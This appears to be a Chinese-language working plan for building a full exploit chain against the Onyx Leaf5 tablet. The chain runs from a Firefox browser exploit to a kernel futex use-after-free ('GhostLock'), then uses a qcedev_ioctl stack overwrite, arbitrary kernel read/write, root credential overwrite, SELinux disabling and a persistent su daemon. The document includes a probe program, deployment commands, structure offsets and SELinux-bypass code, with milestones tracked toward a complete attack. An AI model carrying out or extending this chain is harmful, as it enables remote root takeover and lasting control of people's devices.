> **文档类型**: 计划文档（后续工作清单） | **状态**: ✅ 有效 | **最后更新**: 2026-07-24

# Leaf5 GhostLock — 后续分析方案

**目标**: Onyx Leaf5 (TabBoox), kernel 4.19.157, Android 13
**漏洞**: CVE-2026-43499 (GhostLock)
**当前阶段**: 栈覆盖路由已突破（qcedev_ioctl 发现），进入 exploit 集成验证阶段

---

## 一、当前状态总览

### 1.1 已完成（不可逆）

| 模块 | 状态 | 关键指标 |
|------|------|---------|
| 设备画像 | ✅ | 完整指纹、CONFIG、安全面 |
| 内核镜像 | ✅ | boot_a.bin 匹配 runtime #245 |
| 符号表 | ✅ | vmlinux.elf 121883 symbols |
| 偏移提取 | ✅ | capstone 验证关键结构体偏移 |
| target.h | ✅ | exploit/targets/onyx-leaf5/target.h |
| Docker 编译 | ✅ | preload.so + test programs |
| Futex 哈希自检 | ✅ | V1 布局，用户态一致性通过 |
| Futex 碰撞时序 | ✅ | pile-up 26x baseline，有效侧信道 |
| KernelSnitch 泄漏 | ✅ | KSNITCH_COLLISIONS=2，<1 秒可靠泄漏 |
| sk_buff 喷射 | ✅ | 4/4 send 成功 (ret=65536) |
| KASLR bypass | ✅ | Direct-map 直接计算，无需 slide |
| 栈覆盖路由分析 | ✅ | 5 路由分析完成，pselect/sendmsg/recvmsg/binder/do_select 均不可行 |
| 全局 CFU 扫描 | ✅ | 309 函数/724 调用点，发现 qcedev_ioctl 等 143 个可行路由 |

### 1.2 阻塞点已突破

**原阻塞**: pselect 栈覆盖 Δ=-46 词，waiter 在 fd_set 下方 368 字节，无法栈覆盖。
**突破**: 全局 copy_from_user 扫描发现 **qcedev_ioctl**（`/dev/qcedev`）的 328 字节用户缓冲区在标准 ioctl 深度下与 waiter **完全重叠**（64/64 字节）。

**新利用链**:
```
KernelSnitch 泄漏 → sk_buff 喷射 → GhostLock 触发
    → qcedev_ioctl 栈覆盖（替换 pselect）
    → configfs/ashmem fops 覆写 → pipe physrw → 提权
```

### 1.3 关键优势（相对 OPPO Find N2）

- ✅ **无内核 CFI** — 无需 CFI bypass，最大优势
- ✅ **无 KPTI** — 无 trampoline 开销，侧信道方法更多
- ✅ **AVB unlocked** — 可导出/修改内核
- ✅ **PANIC_ON_OOPS=off** — 调试容错更好

---

## 二、后续阶段规划

```
Phase 1 (P0)  qcedev_ioctl 栈覆盖验证        ████████████ 预计 1-2h
Phase 2 (P0)  Exploit 集成 + 端到端测试       ████████████ 预计 2-4h
Phase 3 (P1)  内核 R/W 原语建立               ████████████ 预计 2-3h
Phase 4 (P1)  提权链 + SELinux bypass          ████████████ 预计 2-3h
Phase 5 (P2)  偏移精校 + 边界情况              ████████████ 预计 2-3h
Phase 6 (P2)  Stage1 浏览器验证                ████████████ 预计 1-2h
```

---

## 三、Phase 1: qcedev_ioctl 栈覆盖验证 🔴 P0

> **目标**: 确认 qcedev_ioctl 路由在实际设备上可用，编写最小验证探针
> **预计**: 1-2 小时
> **前置**: 无（设备在线即可）

### 3.1 确认设备节点可访问性

```bash
# 确认设备节点存在且权限正确
adb shell ls -la /dev/qcedev
# 预期: crw-rw-rw- 1 system system ... /dev/qcedev

# 确认 shell 用户可以 open
adb shell "test -r /dev/qcedev && test -w /dev/qcedev && echo 'OK' || echo 'FAIL'"
```

### 3.2 逆向 QCEDEV_IOCTL_ENC_REQ 命令码

从 vmlinux.elf 反汇编提取 ioctl 命令号：

```bash
cd leaf5
# 在 qcedev_ioctl 中找到 switch case 分发逻辑
uv run python -c "
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
from elftools.elf.elffile import ELFFile

elf = ELFFile(open('raw/vmlinux.elf', 'rb'))
symtab = elf.get_section_by_name('.symtab')

# 定位 qcedev_ioctl
for sym in symtab.iter_symbols():
    if sym.name == 'qcedev_ioctl':
        func_addr = sym.entry.st_value
        func_size = sym.entry.st_size
        print(f'qcedev_ioctl @ 0x{func_addr:x}, size={func_size}')
        break

# TODO: 反汇编 qcedev_ioctl，提取 CMP/CBNZ 前的立即数作为 ioctl cmd
"
```

**关键产出**: `QCEDEV_IOCTL_ENC_REQ` 命令码（如 `0x40104d00` 或类似值）。

### 3.3 编写 NDK 最小探针

创建 `leaf5/probes/qcedev_probe/`：

```c
// qcedev_probe.c — 最小 ioctl 探针
// 编译: $NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android33-clang -static qcedev_probe.c -o qcedev_probe

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>

// 从 vmlinux.elf 逆向得到的命令码（待填入实际值）
#define QCEDEV_IOCTL_ENC_REQ  0xFFFFFFFF  // TODO: 从反汇编提取

struct qcedev_enc_req {
    // 待从反汇编推断结构体布局
    char opaque[328];  // CFU 大小 = 328 字节
};

int main() {
    int fd = open("/dev/qcedev", O_RDWR);
    if (fd < 0) {
        perror("open /dev/qcedev");
        return 1;
    }
    printf("[+] /dev/qcedev opened (fd=%d)\n", fd);

    struct qcedev_enc_req req;
    memset(&req, 0x41, sizeof(req));  // 填充 'A' 用于识别

    int ret = ioctl(fd, QCEDEV_IOCTL_ENC_REQ, &req);
    printf("[+] ioctl returned: %d (errno=%d: %s)\n", ret, errno, strerror(errno));

    close(fd);
    return ret < 0 ? 1 : 0;
}
```

```bash
# 编译并部署
cd leaf5/probes/qcedev_probe
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android33-clang -static qcedev_probe.c -o qcedev_probe
adb push qcedev_probe /data/local/tmp/
adb shell /data/local/tmp/qcedev_probe
```

**验证标准**:
- [ ] `/dev/qcedev` open 成功
- [ ] ioctl 调用返回（即使返回 -1 也说明到达了内核路径）
- [ ] 无 kernel panic/oops（dmesg 检查）

### 3.4 结构体逆向（如 ioctl 返回 -EINVAL）

如果 ioctl 返回 `-EINVAL`，需要进一步逆向 `qcedev_ioctl` 中的 switch case 来还原 `struct qcedev_enc_req` 的布局：

```bash
# 使用 capstone 反汇编 qcedev_ioctl，追踪 copy_from_user 后对缓冲区的访问模式
uv run python -m scripts.analyze_ioctl_struct qcedev_ioctl --output qcedev_struct.h
```

### 3.5 备选路由准备

如果 qcedev_ioctl 因权限/SELinux 阻塞：

| 备选 | 函数 | 缓冲区 | 覆盖率 | 设备节点 |
|------|------|--------|--------|---------|
| #1 | `ipa3_ioctl` | 108B @ SP+0x30 | FULL (64B) | `/dev/ipa` |
| #2 | `compat_qcedev_ioctl` | 328B @ SP+0x120 | FULL (64B) | `/dev/qcedev` (compat) |

对每个备选执行相同的 3.1-3.3 步骤。

---

## 四、Phase 2: Exploit 集成 + 端到端测试 🔴 P0

> **目标**: 将 qcedev_ioctl 栈覆盖集成到 exploit 链，替换 pselect 路径，完成端到端 GhostLock 触发→覆盖→fops 覆写
> **预计**: 2-4 小时
> **前置**: Phase 1 完成

### 4.1 fops.c 改造

当前 `exploit/src/fops.c` 使用 pselect fd_set 位图覆盖 waiter。需要新增 qcedev_ioctl 路径：

**改造要点**:

1. **新增 `qcedev_stack_overwrite()` 函数** — 替代 `do_pselect_stack_overwrite()`
   - `fd = open("/dev/qcedev", O_RDWR)`
   - 构造 `qcedev_enc_req` 结构体，将 fake waiter 字段嵌入用户缓冲区对应偏移
   - 调用 `ioctl(fd, QCEDEV_IOCTL_ENC_REQ, &req)`

2. **waiter 字段在用户缓冲区中的偏移映射**:
   ```
   qcedev_ioctl 帧 SP+0x50 = CFU dest
   waiter 在 futex_wait 帧 SP+0x50
   绝对偏移: dest_abs = -(0xA0+0x360)+0x50 = -0x3B0
   waiter 在 dest 中的偏移 = -0x380 - (-0x3B0) = 0x30
   
   所以 fake waiter 数据应写入 req.opaque[0x30] 开始的位置
   ```

3. **条件编译** — 保留 pselect 路径作为 fallback，新增 `STACK_OVERWRITE_ROUTE=qcedev` 选择

### 4.2 target.h 新增定义

在 `exploit/targets/onyx-leaf5/target.h` 中新增：

```c
// qcedev_ioctl 栈覆盖参数
#define QCEDEV_IOCTL_ENC_REQ    0x________  // 从 Phase 1 逆向得到
#define QCEDEV_BUF_SIZE         328
#define QCEDEV_WAITER_OFFSET    0x30        // waiter 在 qcedev 缓冲区中的偏移

// 栈覆盖路由选择
#define STACK_OVERWRITE_ROUTE_QCEDEV  1
#define STACK_OVERWRITE_ROUTE_PSELECT 0  // 保留但禁用
```

### 4.3 端到端测试

```bash
# 编译
cd exploit
./docker-build.sh TARGET_DIR=targets/onyx-leaf5

# 部署
adb push preload.so /data/local/tmp/

# 运行 exploit（qcedev 路由）
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so STACK_OVERWRITE_ROUTE=qcedev /system/bin/toybox ls /dev/null'

# 监控内核日志
adb shell dmesg -w | grep -E 'panic|oops|BUG|GhostLock|waiter|qcedev'
```

**验证标准**:
- [ ] GhostLock futex 触发成功（UAF waiter 产生）
- [ ] qcedev_ioctl 栈覆盖执行无 crash
- [ ] fake waiter 字段成功写入栈上 waiter 位置
- [ ] PI chain walk 被触发
- [ ] configfs/ashmem fops 覆写成功（或到达该阶段）
- [ ] 无内核 panic/oops

### 4.4 故障排查

| 症状 | 可能原因 | 诊断方法 |
|------|---------|---------|
| ioctl 返回 -EINVAL | 命令码或结构体布局错误 | 重新逆向 qcedev_ioctl switch case |
| ioctl 返回 -EACCES | SELinux 拦截 | `adb logcat -b events \| grep -i denied` |
| 覆盖后无效果 | waiter 偏移计算错误 | 在 qcedev_ioctl CFU 前后加 kprobe（需 root） |
| PI chain walk 未触发 | lock/task 字段值不正确 | 核对 sk_buff 喷射的堆地址 |
| 内核 panic | 假 lock 指向无效内存 | 检查 fake mmap 地址与 sk_buff 数据对齐 |

---

## 五、Phase 3: 内核 R/W 原语建立 🟠 P1

> **目标**: 通过 configfs/ashmem fops 覆写建立稳定的内核任意读写原语
> **预计**: 2-3 小时
> **前置**: Phase 2 完成（栈覆盖成功写入 fake waiter）

### 5.1 configfs fops 覆写

Leaf5 使用 4.19 内核，configfs 函数名为 `configfs_read_file` / `configfs_write_file`（非 5.10 的 iter 版本）：

**关键偏移**（需 pahole 确认）:

| 符号 | 预期偏移 | 验证状态 |
|------|---------|---------|
| `configfs_read_file` | 从 vmlinux.elf 符号表 | `[SYM]` |
| `configfs_write_file` | 从 vmlinux.elf 符号表 | `[SYM]` |
| `ashmem_misc_fops` | 通过 `ashmem_misc` + 0x10 | `[SRC]` |
| `ashmem_mmap` | 符号表 | `[SYM]` |

### 5.2 pipe physrw 验证

configfs/ashmem 覆写成功后，验证 pipe physrw 的读写能力：

```bash
# 测试内核任意读
adb shell '.../test_pipe_read 0xffffff8008000000 256'

# 测试内核任意写
adb shell '.../test_pipe_write 0xffffff8008000000 0x4141414141414141'
```

### 5.3 备选 R/W 原语

如果 configfs/ashmem 路径不可用：

| 方案 | 原理 | 难度 |
|------|------|------|
| `/dev/ion` | DMA 缓冲区物理地址读写 | 中（需逆向 ion ioctl） |
| 直接 sk_buff 路径 | 通过喷射的 sk_buff 数据页写入 | 高 |
| dangling waiter task 字段 | 利用 waiter.task 直接定位当前进程 task_struct | 中 |

---

## 六、Phase 4: 提权链 + SELinux Bypass 🟠 P1

> **目标**: 覆写 cred 结构提权到 root，关闭 SELinux，建立持久化
> **预计**: 2-3 小时
> **前置**: Phase 3 完成（内核 R/W 原语可用）

### 6.1 Cred 覆写

使用 pipe physrw 覆写当前进程的 cred：

```
TARGET: current->cred (task_struct + 0x7e0)
  → uid  = 0  (cred + 0x04)
  → euid = 0  (cred + 0x14)
  → gid  = 0  (cred + 0x08)
  → egid = 0  (cred + 0x18)
  → cap_inheritable = 0xFFFFFFFFFFFFFFFF  (cred + 0x38)
  → cap_permitted   = 0xFFFFFFFFFFFFFFFF  (cred + 0x40)
  → cap_effective   = 0xFFFFFFFFFFFFFFFF  (cred + 0x48)
  → cap_bset        = 0xFFFFFFFFFFFFFFFF  (cred + 0x50)
```

⚠️ **4.19 cred 结构体布局可能与 5.10 不同**，需从 `commit_creds` 反汇编确认 security 指针偏移（`CRED_SECURITY_OFF`）。

### 6.2 SELinux 关闭

```c
// Leaf5 使用 selinux_enforcing_boot（非 selinux_enforcing）
// 先确认变量是否可写（__read_mostly 可能放在只读段）

// 方法 1: 直接写 0 到 selinux_enforcing_boot
kernel_write(SELINUX_ENFORCING_BOOT_ADDR, 0);

// 方法 2: 通过 cred.security 修改 security context
// 方法 3: 通过 selinux_state 结构体修改 enforcing 字段
```

### 6.3 持久化

- [ ] 安装 `su` daemon（通过 kernel R/W 直接写文件系统）
- [ ] 修改 `ro.boot.verifiedbootstate` 内存中的值（如需要）
- [ ] 验证 `adb root` 可用

---

## 七、Phase 5: 偏移精校 + 边界情况 🟡 P2

> **目标**: 将 `[SRC]`/`[EST]` 标记的偏移升级为 `[BIN]` 级别，处理边界情况
> **预计**: 2-3 小时
> **前置**: 可并行于 Phase 1-2

### 7.1 [EST] 偏移验证

| 偏移 | 当前状态 | 验证方法 |
|------|---------|---------|
| `TASK_PID_OFF` (0x5f8) | `[EST]` | 反汇编 `get_pid` / `task_tgid_nr` |
| `TASK_TGID_OFF` (0x5fc) | `[EST]` | 同上 |
| `TASK_TASKS_OFF` | 未确定 | 反汇编 `find_task_by_vpid` 中的 list_for_each |
| `TASK_SECCOMP_OFF` | 未确定 | 反汇编 `secure_computing` |
| `CRED_SECURITY_OFF` | 未确定 | 反汇编 `selinux_cred` / `commit_creds` |

```bash
cd leaf5
# 批量验证 [EST] 偏移
uv run python -m scripts.verify_est_offsets -v
```

### 7.2 SKB_DATA_DELTA 实测

4.19 的 `sk_buff` 布局可能与 5.10 不同，`SKB_DATA_DELTA` 需要实测：

```bash
# 在 exploit 中添加调试输出
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so SKB_DEBUG=1 /system/bin/toybox ls /dev/null' 2>&1 | grep SKB_DATA_DELTA
```

### 7.3 qcedev_ioctl 深度容差测试

验证在非标准调用深度下（如被 SELinux hook 或其他中间层增加栈帧时）覆盖是否仍有效：

- 当前计算深度 = 0xA0 (sys_ioctl + ksys_ioctl + vfs_ioctl)
- 容差范围 = 0x70 - 0x100（全覆盖）
- 实际深度可能因 `security_file_ioctl` LSM hook 而增加 0x20-0x40

```bash
# 如果 SELinux 拦截，实际深度可能为 0xC0-0xE0
# 仍在容差范围内（0x70-0x100）
```

### 7.4 多线程竞态稳定性

GhostLock 触发是竞态条件，需要评估成功率：

- [ ] 连续运行 100 次，统计触发成功率
- [ ] 不同系统负载下的成功率变化
- [ ] 如成功率 <50%，考虑自适应重试策略

---

## 八、Phase 6: Stage1 浏览器验证 🟡 P2

> **目标**: 验证 Firefox 151.0.2 的 CVE-2026-10702 触发条件，确保完整的浏览器→内核利用链可行
> **预计**: 1-2 小时
> **前置**: 可并行于 Phase 1-4

### 8.1 Firefox 版本确认

```bash
adb shell dumpsys package org.mozilla.firefox | grep -E 'versionName|versionCode'
# 预期: versionName=151.0.2
```

### 8.2 CVE-2026-10702 触发测试

- [ ] 部署 Stage1 exploit 页面到本地 HTTP 服务器
- [ ] 通过 `adb shell am start` 启动 Firefox 访问测试页面
- [ ] 监控 logcat 确认 JIT spray / IonMonkey 漏洞触发
- [ ] 验证能否从 JavaScript 调用 native 函数（`LD_PRELOAD` 对浏览器进程生效）

### 8.3 备选浏览器

如果 Firefox 151.0.2 的漏洞已被 patch：

| 应用 | 版本 | CVE |
|------|------|-----|
| Chromium | 待确认 | - |
| Android WebView | 待确认 | - |

---

## 九、风险矩阵

| 风险 | 概率 | 影响 | 缓解措施 |
|------|------|------|---------|
| qcedev_ioctl 被 SELinux 拦截 | 中 | 高 — 栈覆盖路由阻塞 | 备选 ipa3_ioctl 或其他 143 个 CFU 调用点 |
| qcedev_ioctl 命令码/S 结构体难以逆向 | 低 | 中 — 延迟 2-3h | 使用 capstone 深度反汇编 switch case；参考 CAF msm-4.19 源码 |
| configfs 在 shell 上下文不可写 | 中 | 高 — R/W 原语阻塞 | 探索 /dev/ion 或直接 sk_buff 路径建立 R/W |
| selinux_enforcing_boot 不可写 | 中 | 中 — SELinux 无法关闭 | 通过 cred.security 修改 context 绕过 |
| GhostLock 竞态成功概率低 | 低 | 中 — exploit 不可靠 | 自适应重试策略；调整 futex 参数 |
| 4.19 cred 布局与预期不同 | 低 | 中 — 提权失败 | 从 commit_creds 反汇编交叉验证 |
| Firefox CVE-2026-10702 已修复 | 中 | 低 — 不影响内核 exploit | 内核 exploit 可通过 ADB shell 直接触发 |

---

## 十、里程碑与时间线

| 里程碑 | 预计耗时 | 累计 | 判定标准 |
|--------|---------|------|---------|
| M1: qcedev_ioctl 探针可用 | 1-2h | 1-2h | ioctl 调用成功到达内核 |
| M2: 栈覆盖端到端验证 | 2-4h | 3-6h | GhostLock 触发→覆盖→fops 覆写完整链路 |
| M3: 内核 R/W 原语 | 2-3h | 5-9h | pipe physrw 读写内核内存成功 |
| M4: 提权到 root | 2-3h | 7-12h | uid=0, cap=full, SELinux permissive |
| M5: 偏移精校完成 | 2-3h | 9-15h | 所有偏移升级到 [BIN] 级别 |
| M6: 浏览器链验证 | 1-2h | 10-17h | Stage1 + Stage2 完整利用链 |

**总计估计**: 10-17 小时（取决于各阶段的阻塞情况）

---

## 十一、文件产出清单

| 文件 | 阶段 | 说明 |
|------|------|------|
| `leaf5/probes/qcedev_probe/qcedev_probe.c` | Phase 1 | NDK 最小探针 |
| `leaf5/scripts/analyze_ioctl_struct.py` | Phase 1 | ioctl 结构体逆向脚本 |
| `exploit/src/fops.c` (修改) | Phase 2 | 新增 qcedev_ioctl 栈覆盖路径 |
| `exploit/targets/onyx-leaf5/target.h` (修改) | Phase 2 | 新增 QCEDEV 相关宏 |
| `leaf5/scripts/verify_est_offsets.py` | Phase 5 | [EST] 偏移批量验证脚本 |
| `leaf5/docs/QCEDEV_STACK_OVERWRITE.md` | Phase 2 | qcedev_ioctl 栈覆盖详细文档 |

---

## 十二、每日站会检查清单

在每次分析会话开始时检查：

1. **设备在线**: `adb devices` 确认 `ac340d06` 连接
2. **内核版本**: `adb shell cat /proc/version` 确认仍是 `#245 g3d47a6619220`
3. **dmesg 清洁**: `adb shell dmesg | tail -20` 确认无残留 panic/oops
4. **上次进度**: 查看 `PROCESS_LOG.md` 最后一条记录
5. **本次目标**: 确认当前 Phase 和预期产出

---

*最后更新: 2026-07-24*
*基于 README.md v2026-07-24 + 全局 CFU 扫描 (qcedev_ioctl 发现)*
